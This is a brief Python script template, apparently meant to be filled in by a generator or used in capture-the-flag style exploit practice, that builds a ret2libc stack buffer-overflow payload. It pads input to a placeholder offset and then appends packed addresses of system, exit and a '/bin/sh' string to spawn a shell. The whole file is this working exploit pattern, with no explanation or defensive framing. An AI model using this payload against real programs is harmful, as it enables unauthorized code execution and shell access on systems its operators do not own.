import struct
import sys
  
system = {system_addr}
exit   = {exit_addr}
binsh  = {binsh_addr}

payload  = b"A"*{offset}
payload += struct.pack("<I", system)
payload += struct.pack("<I", exit)
payload += struct.pack("<I", binsh)

sys.stdout.buffer.write(payload)
